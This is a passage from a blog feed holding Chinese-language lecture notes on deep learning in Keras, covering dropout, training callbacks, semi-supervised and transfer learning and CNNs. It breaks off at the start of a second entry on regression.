&lt;li&gt;&lt;code&gt;early_stopping=EarlyStopping(monitor='val_loss', patience=3)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;monitor: 要監控的 performance index  &lt;/li&gt;
&lt;li&gt;patience: 可以容忍連續幾次的不思長進  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dropout  &lt;ul&gt;
&lt;li&gt;What is Dropout  &lt;ul&gt;
&lt;li&gt;原本為 neurons 跟 neurons 之間為 fully connected  &lt;/li&gt;
&lt;li&gt;在訓練過程中,隨機拿掉一些連結 (weight 設為0)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;會造成 training performance 變差  &lt;ul&gt;
&lt;li&gt;Error 變大 =&amp;gt; 每個 neuron 修正得越多 =&amp;gt; 做得越好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Implications  &lt;ul&gt;
&lt;li&gt;增加訓練的難度，在真正的考驗時爆發  &lt;/li&gt;
&lt;li&gt;Dropout 可視為一種終極的 ensemble 方法，N 個 weights 會有 2^N 種 network structures  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;通常只加在 hidden layer，不會加在 output layer，因為影響太大了，除非 output layer 的 dimension 很大。  &lt;/li&gt;
&lt;li&gt;注意事項  &lt;ul&gt;
&lt;li&gt;「不要一開始就加入 Dropout」*3  &lt;/li&gt;
&lt;li&gt;確定有遇到 Overfitting 再加 Dropout  &lt;/li&gt;
&lt;li&gt;Dropout 會讓 training performance 變差  &lt;/li&gt;
&lt;li&gt;確定 performance 夠好再加 Dropout，不然 Performance 變低，就算解掉了 Overfitting，出來的結果也沒啥用。  &lt;/li&gt;
&lt;li&gt;Dropout 是在避免 overfitting，不是萬靈丹  &lt;/li&gt;
&lt;li&gt;參數少時，regularization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Callbacks: 善用 Callbacks 幫助你躺著 train models&lt;/h3&gt;
&lt;h4&gt;Callback Class&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keras.callbacks&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Callbacks&lt;/span&gt;  

&lt;span class="n"&gt;Class&lt;/span&gt; &lt;span class="n"&gt;LossHistory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Callbacks&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_train_begin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{}):&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;val_loss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;val_acc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_batch_end&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;batch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{}):&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loss&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;loss&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;acc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;val_loss&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;val_loss&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;val_acc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;val_acc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  

    &lt;span class="n"&gt;loss_history&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;LossHistory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Callback 的時機&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;on_train_begin  &lt;/li&gt;
&lt;li&gt;on_train_end  &lt;/li&gt;
&lt;li&gt;on_batch_begin  &lt;/li&gt;
&lt;li&gt;on_batch_end  &lt;/li&gt;
&lt;li&gt;on_epoch_begin  &lt;/li&gt;
&lt;li&gt;on_epoch_end  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;LearningRateScheduler&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keras.callbacks&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;LearningRateScheduler&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;step_decay&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;epoch&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="n"&gt;initial_lrate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;  
    &lt;span class="n"&gt;lrate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;initial_lrate&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.999&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;epoch&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;lrate&lt;/span&gt;  

&lt;span class="n"&gt;Lrate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;LearningRateScheduler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;step_decay&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;ModelCheckpoint&lt;/h4&gt;
&lt;p&gt;超級好用  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keras.callbacks&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ModelCheckpoint&lt;/span&gt;  

&lt;span class="n"&gt;checkpoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ModelCheckpoint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;  
    &lt;span class="s1"&gt;&amp;#39;model.h5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;monitor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;val_loss&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;verbose&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;save_best_only&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;min&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mode&lt;/code&gt; 可以設定成 &lt;code&gt;'auto'&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;在 &lt;code&gt;model.fit&lt;/code&gt; 時加入 Callbacks&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;history = model.fit(  
    X_train,  
    Y_train,  
    batch_size=16,  
    verbose=0,  
    epochs=30,  
    shuffle=True,  
    validation_split=0.1,  
    callbacks=[  
        early_stopping,  
        loss_history,  
        lrate,  
        checkpoint,  
    ],  
)  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但也不要一開始就加一堆 callbacks&lt;br /&gt;
尤其是 Learning Rate Scheduler&lt;br /&gt;
不好的 Learning Rate Scheduler 會導致不好的結果  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Semi-supervised Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;解決的問題  &lt;ul&gt;
&lt;li&gt;收集到的標籤遠少於實際擁有的資料量  &lt;ul&gt;
&lt;li&gt;該如何增加 label 呢?  &lt;ul&gt;
&lt;li&gt;Crowd-sourcing  &lt;/li&gt;
&lt;li&gt;Semi-supervised learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;步驟  &lt;ul&gt;
&lt;li&gt;先用 labeled dataset to train model  &lt;ul&gt;
&lt;li&gt;至少 train 到一定的程度 (良心事業)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;拿 unlabeled dataset 來測試，挑出預測好的 unlabeled dataset  &lt;/li&gt;
&lt;li&gt;假設預測的都是對的 (unlabeled =&amp;gt; labeled)  &lt;ul&gt;
&lt;li&gt;有更多 labeled dataset 了!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Repeat the above steps  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;注意事項  &lt;ul&gt;
&lt;li&gt;加入品質不佳的 labels 反而會讓 model 變差  &lt;/li&gt;
&lt;li&gt;要注意加入的資料有沒有偏差的情況，否則最後 train 出來的 model 會變成只偏向某一類的結果  &lt;/li&gt;
&lt;li&gt;慎選要加入的 samples  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Transfer Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;“transfer”: use the knowledge learned from task A to tackle another task B  &lt;/li&gt;
&lt;li&gt;Use as Fixed Feature Extractor  &lt;ul&gt;
&lt;li&gt;A known model, like VGG, trained on ImageNet  &lt;/li&gt;
&lt;li&gt;ImageNet: 10 millions images with labels  &lt;/li&gt;
&lt;li&gt;取某一個 layer output 當作 feature vectors  &lt;/li&gt;
&lt;li&gt;Train a classifier based on the features extracted by a known model  &lt;/li&gt;
&lt;li&gt;當資料很少的時候這招很好用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use as Initialization  &lt;ul&gt;
&lt;li&gt;Initialize your net by the weights of a known model  &lt;/li&gt;
&lt;li&gt;Use your dataset to further train your model  &lt;/li&gt;
&lt;li&gt;Fine-tuning the known model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Short Summary&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Unlabeled data (lack of y) =&amp;gt; Semi-supervised learning  &lt;/li&gt;
&lt;li&gt;Insufficient data (lack of both x and y) =&amp;gt; Transfer learning (focus on layer transfer)  &lt;ul&gt;
&lt;li&gt;Use as fixed feature extractor  &lt;/li&gt;
&lt;li&gt;Use as initialization  &lt;/li&gt;
&lt;li&gt;Resources: https://keras.io/applications/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Convolutional Neural Network (CNN)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;只要 input 是二維以上，且要找特定的 Pattern 的話，就可以用 CNN，不侷限於影像。  &lt;/li&gt;
&lt;li&gt;DNN 的輸入是一維的向量,那二維的矩陣呢? 例如：圖形資料  &lt;/li&gt;
&lt;li&gt;將圖形轉換成一維向量  &lt;ul&gt;
&lt;li&gt;Weight 數過多,造成 training 所需時間太長  &lt;/li&gt;
&lt;li&gt;左上的圖形跟右下的圖形真的有關係嗎?  &lt;ul&gt;
&lt;li&gt;只要留下重要的地方就好了，不需要全部的 neuron 都連接起來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;圖的構成  &lt;ul&gt;
&lt;li&gt;線條 (Line Segment)  &lt;/li&gt;
&lt;li&gt;圖案 (Pattern)  &lt;/li&gt;
&lt;li&gt;物件 (Object)  &lt;/li&gt;
&lt;li&gt;場景 (Scene)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;辨識一個物件只需要幾個特定的圖案  &lt;/li&gt;
&lt;li&gt;Property  &lt;ul&gt;
&lt;li&gt;What: 圖案的類型  &lt;/li&gt;
&lt;li&gt;Where: 重複的圖案可能出現在很多不同的地方  &lt;/li&gt;
&lt;li&gt;Size: 大小的變化並沒有太多的影響  &lt;ul&gt;
&lt;li&gt;Subsampling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convolution in Computer Vision  &lt;ul&gt;
&lt;li&gt;Common applications  &lt;ul&gt;
&lt;li&gt;模糊化、銳利化、浮雕  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://setosa.io/ev/image-kernels/"&gt;http://setosa.io/ev/image-kernels/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adding each pixel and its local neighbors which are weighted by a filter (kernel)  &lt;/li&gt;
&lt;li&gt;Perform this convolution process to every pixels  &lt;ul&gt;
&lt;li&gt;當 pixel 的 value 高的時候，代表 pattern 有出現在該位置  &lt;/li&gt;
&lt;li&gt;當 pixel 的 value 低的時候，代表 pattern 沒有出現在該位置  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A filter could be seen as a pattern  &lt;/li&gt;
&lt;li&gt;常拿來做 Edge Detection  &lt;ul&gt;
&lt;li&gt;edge = 亮度變化大的地方  &lt;/li&gt;
&lt;li&gt;凸顯兩像素之間的差異  &lt;/li&gt;
&lt;li&gt;如果覺得 gap 太小的話，可以再乘上一個 constant 將其凸顯出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;相鄰兩像素值差異越大,convolution 後新像素絕對值越大  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convolutional Layer  &lt;ul&gt;
&lt;li&gt;Convolution 執行越多次影像越小  &lt;/li&gt;
&lt;li&gt;Hyper-parameters of Convolutional Layer  &lt;ul&gt;
&lt;li&gt;Filter size  &lt;/li&gt;
&lt;li&gt;Zero-padding  &lt;ul&gt;
&lt;li&gt;Add additional zeros at the border of image  &lt;/li&gt;
&lt;li&gt;Zero-padding 不會影響 convolution 的性質  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Stride  &lt;ul&gt;
&lt;li&gt;Shrink the output of the convolutional layer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Depth (total number of filters)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pooling Layer  &lt;ul&gt;
&lt;li&gt;Why do we need pooling layers?  &lt;ul&gt;
&lt;li&gt;Reduce the number of weights  &lt;/li&gt;
&lt;li&gt;Prevent overfitting  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Max pooling  &lt;ul&gt;
&lt;li&gt;Consider the existence of patterns in each region  &lt;/li&gt;
&lt;li&gt;在作 Classification 上用得到  &lt;ul&gt;
&lt;li&gt;因為我們在做分類的時候會找尋特定的 pattern 是否有出現在該圖片中  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但是會有些資訊喪失  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Average Pooling  &lt;ul&gt;
&lt;li&gt;因為是取平均的關係，所以出來的結果很高的話，代表該區域的值都很高，所以 pattern 出現在該位置的可能性也很高  &lt;/li&gt;
&lt;li&gt;用來找尋一再重複出現的 pattern  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A CNN Example (Object Recognition)  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://cs231n.github.io/convolutional-networks/"&gt;CS321n, Standford&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Filters Visualization  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.rsipvision.com/exploring-deep-learning/"&gt;RSIP VISION&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;CNN in Keras&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Concatenate Datasets by Numpy Functions  &lt;ul&gt;
&lt;li&gt;hstack, dim(6,)  &lt;ul&gt;
&lt;li&gt;[1, 2, 3, 4, 5, 6], Labels  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;vstack, dim(2,3)  &lt;ul&gt;
&lt;li&gt;[[1, 2, 3], [4, 5, 6]], Pixel values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;dstack, dim(1, 3, 2)  &lt;ul&gt;
&lt;li&gt;[[1, 2], [3, 4], [5, 6]], Dimensions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Concatenating Input Datasets  &lt;ul&gt;
&lt;li&gt;利用 vstack 連接 pixel values;用 hstack 連接 labels  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reshape the Training/Testing Inputs  &lt;ul&gt;
&lt;li&gt;利用影像的長寬資訊先將 RGB 影像分開,再利用 reshape 函式將一維向量轉換為二維矩陣,最後用 dstack 將 RGB image 連接成三維陣列  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Saving Each Data as Image  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;scipy.misc.imsave&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;PIL.Image&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Building Your Own CNN Model  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;#39;&amp;#39;&amp;#39;CNN model&amp;#39;&amp;#39;&amp;#39;  

# CNN  
model = Sequential()  
model.add(  
Convolution2D(  
    32,  
    3,  
    3,  
    border_mode=&amp;#39;same&amp;#39;,  # 有做 zero-padding 的意思  
    input_shape=X_train[0].shape)  
)  
model.add(Activation(&amp;#39;relu&amp;#39;))  
model.add(Convolution2D(32, 3, 3))  
model.add(Activation(&amp;#39;relu&amp;#39;))  
model.add(MaxPooling2D(pool_size=(2, 2)))  
model.add(Dropout(0.2))  

model.add(Flatten())  

# DNN  
model.add(Dense(512))  
model.add(Activation(&amp;#39;relu&amp;#39;))  
model.add(Dropout(0.5))  
model.add(Dense(10))  
model.add(Activation(&amp;#39;softmax&amp;#39;))  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Tips for Setting Hyper-parameters  &lt;ul&gt;
&lt;li&gt;影像的大小須要能夠被 2 整除數次  &lt;/li&gt;
&lt;li&gt;Convolutional Layer  &lt;ul&gt;
&lt;li&gt;比起使用一個 size 較大的 filter (7x7),可以先嘗試連續使用數個 size 小的 filter (3x3)  &lt;/li&gt;
&lt;li&gt;Stride 的值與 filter size 相關,通常 stride ≤ (W_f - 1)/2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Very deep CNN model (16+ Layers) 多使用 3x3 filter 與 stride 1  &lt;/li&gt;
&lt;li&gt;Zero-padding 與 pooling layer 是選擇性的結構  &lt;/li&gt;
&lt;li&gt;Zero-padding 的使用取決於是否要保留邊界的資訊  &lt;/li&gt;
&lt;li&gt;Pooling layer 旨在避免 overfitting 與降低 weights 的數量, 但也減少影像所包含資訊,一般不會大於 3x3  &lt;ul&gt;
&lt;li&gt;像圍棋就不太適合用 Pooling，因為可能會失真。所以 AlphaGo 其實只有用 Convolutional Layer，沒有用 Pooling Layer。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;嘗試修改有不錯效能的 model,會比建立一個全新的模型容易收斂,且 model weights 越多越難 tune 出好的參數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Deep Learning Applications&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://visualqa.org/"&gt;Visual Question Answering&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Video Captioning  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/pdf/1701.00160.pdf"&gt;Text-To-Image&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/pdf/1511.06434.pdf"&gt;Vector Arithmetic for Visual Concepts&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Go Deeper in Deep Learning  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://neuralnetworksanddeeplearning.com/"&gt;Neural Networks and Deep Learning&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.iro.umontreal.ca/~bengioy/dlbook/"&gt;Deep Learning&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://speech.ee.ntu.edu.tw/~tlkagk/courses_MLSD15_2.html"&gt;Course: Machine learning and having it deep and structured&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://keras.io/"&gt;Keras documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fchollet/keras"&gt;Keras GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/channel/UC2ggjtuuWvxrHHHiaDH1dlQ"&gt;台大電機李宏毅教授 Youtube 頻道&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://cs231n.stanford.edu/"&gt;Convolutional Neural Networks for Visual Recognition cs231n&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Q&amp;amp;A&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如果 feature 數量不夠的話，可以做些簡單的運算增加 feature 的量，尤其是已經知道這樣的 feature 會對 training 有幫助的話。  &lt;/li&gt;
&lt;li&gt;Keras model 相關的操作  &lt;ul&gt;
&lt;li&gt;用 &lt;code&gt;model.save()&lt;/code&gt; 來將訓練好的 model 存起來  &lt;/li&gt;
&lt;li&gt;之後可用 &lt;code&gt;keras.models.load_model()&lt;/code&gt; 來讀入已經訓練好的 model  &lt;/li&gt;
&lt;li&gt;讀入之後可再用 &lt;code&gt;model.summary()&lt;/code&gt; 來確認一下 model 的資訊  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;model.layers[0].get_weights()&lt;/code&gt; 可以得到此 model 第 1 層的 weights  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;model.predict()&lt;/code&gt; 來預測結果  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;當資料太大無法一次讀進來時，可以用 &lt;a href="https://keras.io/models/sequential/#fit_generator"&gt;Fit Generator&lt;/a&gt;。  &lt;ul&gt;
&lt;li&gt;需要自己撰寫一個 generator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Deep Learning"></category><category term="Keras"></category><category term="CNN"></category><category term="DNN"></category></entry><entry><title>台灣資料科學年會之系列活動：深入淺出深度學習 (Dive into Deep Learning)</title><link href="https://blog.m157q.tw/posts/2017/08/12/dive-into-deep-learning-datasci-tw/" rel="alternate"></link><published>2017-08-12T17:02:14+08:00</published><updated>2017-08-12T17:02:14+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-12:posts/2017/08/12/dive-into-deep-learning-datasci-tw/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://foundation.datasci.tw/dive-deep-learning-170812/"&gt;http://foundation.datasci.tw/dive-deep-learning-170812/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://dsc.kktix.cc/events/series-events-081213"&gt;https://dsc.kktix.cc/events/series-events-081213&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIVF9CeXpXaC1lUVk/view?usp=sharing"&gt;DiveDL_0326_v1.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Regression&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;適用場景  &lt;ul&gt;
&lt;li&gt;股票預測  &lt;/li&gt;
&lt;li&gt;無人車方向調整  &lt;/li&gt;
&lt;li&gt;推薦系統  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;步驟  &lt;ul&gt;
&lt;li&gt;決定 Model  &lt;/li&gt;
&lt;li&gt;評估所使用的函數夠不夠好  &lt;ul&gt;
